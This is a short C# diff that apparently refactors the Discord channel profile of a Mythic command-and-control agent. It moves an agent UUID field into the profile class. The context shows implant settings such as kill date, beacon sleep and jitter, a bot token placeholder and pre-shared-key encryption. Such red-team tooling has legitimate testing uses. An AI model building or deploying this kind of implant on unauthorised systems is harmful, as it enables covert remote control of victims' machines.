@@ -19,13 +19,11 @@ namespace Profiles
     public class Config : IConfig
     {
         public IProfile profile { get; set; }
-        public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
         public Config()
         {
-            uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
@@ -37,6 +35,7 @@ namespace Profiles
     }
     public class Discord : IProfile
     {
+        public string uuid { get; set; }
         public bool encrypted { get; set; }
         public string messageToken { get; set; }
         public int messageChecks { get; set; }
@@ -55,6 +54,7 @@ namespace Profiles
         private string agent_guid = Guid.NewGuid().ToString();
         public Discord()
         {
+            this.uuid = "%UUID%";
             this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             this.messageToken = "discord_token";
             this.ChannelID = "bot_channel";
@@ -68,7 +68,7 @@ namespace Profiles
 
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(Config.uuid, this.psk);
+                this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
 
@@ -116,7 +116,7 @@ namespace Profiles
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(Config.uuid + json);
+                    json = await Misc.Base64Encode(this.uuid + json);
                 }
 
                 MythicMessageWrapper msg = new MythicMessageWrapper()
